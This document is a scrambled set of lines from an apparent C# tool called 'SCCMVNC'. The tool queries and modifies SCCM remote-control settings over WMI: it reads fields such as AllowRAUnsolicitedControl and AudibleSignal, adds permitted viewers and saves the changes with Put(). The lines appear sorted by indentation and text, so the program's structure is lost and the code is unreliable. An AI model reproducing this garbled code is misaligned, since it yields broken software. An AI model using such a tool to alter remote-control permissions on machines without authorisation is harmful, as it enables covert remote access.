    
                    
                    // Add viewer
                    // Display the current value
                    // Display the new value
                    // Extract the Permitted Viewers
                    // Set to view only with no remote control
                    Help()
                    ReadSccmRemoteControlConfig(computerName)
                    break
                    mObject.Put()
                    viewOnly = true
                // Connect to the WMI namespace
                // Construct the WMI scope path
                // Iterate through the results (It is supposed to be just one)
                // Iterate through the results (usually only one)
                // WMI query to get the Ccm_RemoteToolsConfig class
                Help()
                ManagementObjectCollection queryCollection = searcher.Get()
                ManagementScope scope = new ManagementScope(wmiScopePath)
                default:
                else
                foreach (ManagementObject mObject in queryCollection)
                if (ex.ErrorCode == ManagementStatus.InvalidNamespace)
                return
                scope.Connect()
                {
                }
            Console.WriteLine(output)
            Console.WriteLine(separatorLine)
            bool viewOnly = false
            catch (Exception e)
            catch (ManagementException ex)
            catch (UnauthorizedAccessException)
            for (int i = 1
            if (output.Length < totalWidth)
            if (processedArgs.Length == 0)
            int padding = (totalWidth - message.Length) / 2
            int totalWidth = 70
            string action = processedArgs[0].ToLower()
            string viewer = null
            switch (action)
            try
            {
            }
        static void Help()
        static void Main(string[] args)
        static void PrintError(string message)
        static void PrintStatus(string message)
        static void ReadSccmRemoteControlConfig(string computerName)
        {
        }
    class Program
    using System
    using System.Collections.Generic
    using System.Management
    using System.Runtime.InteropServices
    {
    }
 // Default to local computer
 1 : 2
 Compile
 Connect to the host via native SCCM Remote Control tool
 Details
 SCCMVNC
 Usage
 e.Message)
 ex.Message)
 i < processedArgs.Length
 message 
"                    Console.WriteLine(""{0,-60}: {1}"", ""AccessLevel"", mObject[""AccessLevel""])"
"                    Console.WriteLine(""{0,-60}: {1}"", ""AllowClientChange"", mObject[""AllowClientChange""])"
"                    Console.WriteLine(""{0,-60}: {1}"", ""AllowLocalAdminToDoRemoteControl"", mObject[""AllowLocalAdminToDoRemoteControl""])"
"                    Console.WriteLine(""{0,-60}: {1}"", ""AllowRAUnsolicitedControl"", mObject[""AllowRAUnsolicitedControl""])"
"                    Console.WriteLine(""{0,-60}: {1}"", ""AllowRAUnsolicitedView"", mObject[""AllowRAUnsolicitedView""])"
"                    Console.WriteLine(""{0,-60}: {1}"", ""AllowRemCtrlToUnattended"", mObject[""AllowRemCtrlToUnattended""])"
"                    Console.WriteLine(""{0,-60}: {1}"", ""AudibleSignal"", mObject[""AudibleSignal""])"
"                    Console.WriteLine(""{0,-60}: {1}"", ""ClipboardAccessPermissionRequired"", mObject[""ClipboardAccessPermissionRequired""])"
"                    Console.WriteLine(""{0,-60}: {1}"", ""Current AccessLevel"", mObject[""AccessLevel""])"
"                    Console.WriteLine(""{0,-60}: {1}"", ""Current AllowClientChange"", mObject[""AllowClientChange""])"
"                    Console.WriteLine(""{0,-60}: {1}"", ""Current AllowLocalAdminToDoRemoteControl"", mObject[""AllowLocalAdminToDoRemoteControl""])"
"                    Console.WriteLine(""{0,-60}: {1}"", ""Current AllowRAUnsolicitedControl"", mObject[""AllowRAUnsolicitedControl""])"
"                    Console.WriteLine(""{0,-60}: {1}"", ""Current AllowRAUnsolicitedView"", mObject[""AllowRAUnsolicitedView""])"
"                    Console.WriteLine(""{0,-60}: {1}"", ""Current AllowRemCtrlToUnattended"", mObject[""AllowRemCtrlToUnattended""])"
"                    Console.WriteLine(""{0,-60}: {1}"", ""Current AudibleSignal"", mObject[""AudibleSignal""])"
"                    Console.WriteLine(""{0,-60}: {1}"", ""Current ClipboardAccessPermissionRequired"", mObject[""ClipboardAccessPermissionRequired""])"
"                    Console.WriteLine(""{0,-60}: {1}"", ""Current EnableRA"", mObject[""EnableRA""])"
